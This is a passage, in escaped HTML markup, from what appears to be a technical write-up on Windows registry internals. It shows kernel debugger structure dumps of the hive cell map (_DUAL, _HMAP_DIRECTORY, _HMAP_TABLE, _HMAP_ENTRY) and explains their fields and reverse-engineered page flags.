 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_DUAL&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_DUAL&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HMAP_DIRECTORY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SmallDir&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HMAP_TABLE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x018&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Guard&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x020&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FreeDisplay&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[24]&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_FREE_DISPLAY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x260&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FreeBins&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LIST_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x270&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;FreeSummary&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Let&amp;#39;s examine the semantics of each field:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_d2x9ez3q88fg-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Length:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Expresses the current length of the given storage space in bytes. Directly after loading the hive, the stable length is equal to the size of the hive on disk (including any data recovered from log files, minus the 4096 bytes of the header), and the volatile space is empty by definition. Only cell map entries within the [0, Length - 1] range are guaranteed to be valid.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Map:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Points to the actual directory structure represented by _HMAP_DIRECTORY.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;SmallDir:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Part of the &amp;quot;small dir&amp;quot; optimization, discussed in the next section.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Guard:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Its specific role is unclear, as the field is always initialized to 0xFFFFFFFF upon allocation and never used afterwards. I expect that it is some kind of debugging remnant from the early days of the registry development, presumably related to the small dir optimization.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;FreeDisplay:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;A data structure used to optimize searches for free cells during the cell allocation process. It consists of 24 buckets, each corresponding to a specific cell size range and represented by the _FREE_DISPLAY structure, indicating which pages in the hive may potentially contain free cells of the given length.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;FreeBins:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;The head of a doubly-linked list that links the descriptors of entirely empty bins in the hive, represented by the _FREE_HBIN structures.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;FreeSummary:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;A bitmask indicating which buckets within FreeDisplay have any hints set for the given cell size. A zero bit at a given position means that there are no free cells of the specific size range anywhere in the hive.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The next level in the cell map hierarchy is the _HMAP_DIRECTORY structure:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HMAP_DIRECTORY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_HMAP_DIRECTORY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[1024]&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HMAP_TABLE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;As we can see, it is simply a 1024-element array of pointers to _HMAP_TABLE:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HMAP_TABLE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_HMAP_TABLE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Table&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[512]&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HMAP_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Further, we get a 512-element array of pointers to the final level of the cell map, _HMAP_ENTRY:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HMAP_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_HMAP_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;PermanentBinAddress&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;MemAlloc&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;This last level contains a descriptor of a single page in the hive and warrants a deeper analysis. Let&amp;#39;s start by noting that the four least significant bits of PermanentBinAddress correspond to a set of undocumented flags that control various aspects of the page behavior. I was able to reverse-engineer them and partially recover their names, largely thanks to the fact that some older Windows 10 builds contained non-inlined functions operating on these flags, with revealing names like HvpMapEntryIsDiscardable or HvpMapEntryIsTrimmed:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c55&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;enum &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_MAP_ENTRY_FLAGS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; MAP_ENTRY_NEW_ALLOC&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; MAP_ENTRY_DISCARDABLE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; MAP_ENTRY_TRIMMED&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; MAP_ENTRY_DUMMY&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c55 tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Here&amp;#39;s a brief summary of their meaning based on my understanding:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_7xs8c2w8mgl2-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;MAP_ENTRY_NEW_ALLOC:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Indicates that this is the first page of a bin. Cell indexes pointing into this page must specify an offset within the range of [0x20, 0xFFF], as they cannot fall into the first 32 bytes that correspond to the _HBIN structure.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;MAP_ENTRY_DISCARDABLE:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 